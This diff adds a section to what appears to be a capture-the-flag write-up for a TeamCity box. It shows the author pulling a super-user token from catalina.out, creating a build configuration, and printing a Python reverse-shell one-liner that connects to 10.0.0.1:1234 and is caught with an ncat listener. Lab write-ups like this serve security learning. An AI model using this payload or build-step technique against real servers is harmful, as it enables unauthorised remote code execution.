@@ -211,9 +211,76 @@ Now let visit `localhost:8111` to confirm it.
 
 ![image](https://user-images.githubusercontent.com/69868171/117656607-8e78e400-b166-11eb-94e7-79ec757e877d.png)
 
-So i click on Log in as a Super user to create an administrator account. 
+![image](https://user-images.githubusercontent.com/69868171/117674555-c2113980-b179-11eb-9edd-7a0990f56e45.png)
 
-![image](https://user-images.githubusercontent.com/69868171/117659974-98044b00-b16a-11eb-88e2-41288cf36e1e.png)
+So i found the token at `/TeamCity/logs/catalina.out` let use it to log in without username .
 
-So we need  Authentication token: before we can get access with the Super user now go back to the target machine to find it.
+![image](https://user-images.githubusercontent.com/69868171/117674938-1e745900-b17a-11eb-80d0-61ba4488de89.png)
 
+And we are in time to get a reverse shell. Now let click on create New project.
+
+![image](https://user-images.githubusercontent.com/69868171/117675663-c558f500-b17a-11eb-86d2-b5b61685ce0f.png)
+
+And fill in the form with anything and click on create.
+
+![image](https://user-images.githubusercontent.com/69868171/117675876-fafdde00-b17a-11eb-88e5-2fb2e13b0d57.png)
+
+Now let click on the homepage and click the project we just created.
+
+![image](https://user-images.githubusercontent.com/69868171/117675982-1b2d9d00-b17b-11eb-8f07-9830cebb09d7.png)
+
+Click on it to create new build configuration.
+
+![image](https://user-images.githubusercontent.com/69868171/117676598-b0309600-b17b-11eb-9feb-2d2655fe08cc.png)
+
+Click and create and we should get a new page like that below;
+
+![image](https://user-images.githubusercontent.com/69868171/117676805-e110cb00-b17b-11eb-8c41-84bdcf8ba5f7.png)
+
+Let go back to the homepage again to click on the project again.
+
+![image](https://user-images.githubusercontent.com/69868171/117676903-f980e580-b17b-11eb-9edf-429fd88a301f.png)
+
+Now let click on Edit Configuration Settings .
+
+![image](https://user-images.githubusercontent.com/69868171/117677035-187f7780-b17c-11eb-9bee-9379e40cc282.png)
+
+Now click on Build steps .
+
+![image](https://user-images.githubusercontent.com/69868171/117677178-377e0980-b17c-11eb-9e2e-1d7078f5f4ad.png)
+
+Now add build step .
+
+![image](https://user-images.githubusercontent.com/69868171/117677244-49f84300-b17c-11eb-80fb-598eba44f4f6.png)
+
+Let go through it and pick python.
+
+![image](https://user-images.githubusercontent.com/69868171/117677429-714f1000-b17c-11eb-9ea5-52054fb8b759.png)
+
+On command we pick custom script now time to add the python reverse shell script to the box with the name scripts.
+
+`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);` 
+
+Now add our Local-IP address and port also start an ncat listener to get our shell.
+
+![image](https://user-images.githubusercontent.com/69868171/117677892-dd317880-b17c-11eb-972c-2b629db433c6.png)
+
+Now let click on save. 
+
+![image](https://user-images.githubusercontent.com/69868171/117678016-005c2800-b17d-11eb-8251-6499b890a274.png)
+
+Now Click On Run we should have our shell.
+
+![image](https://user-images.githubusercontent.com/69868171/117678103-12d66180-b17d-11eb-9c2b-a552ec046756.png)
+
+And boom we have shell back.
+
+![image](https://user-images.githubusercontent.com/69868171/117678201-27b2f500-b17d-11eb-8e81-abad69055115.png)
+
+Box Rooted .
+
+Greeting From [Muzec](https://twitter.com/muzec_saminu)
+
+<br> <br>
+[Back To Home](../index.md)
+<br>
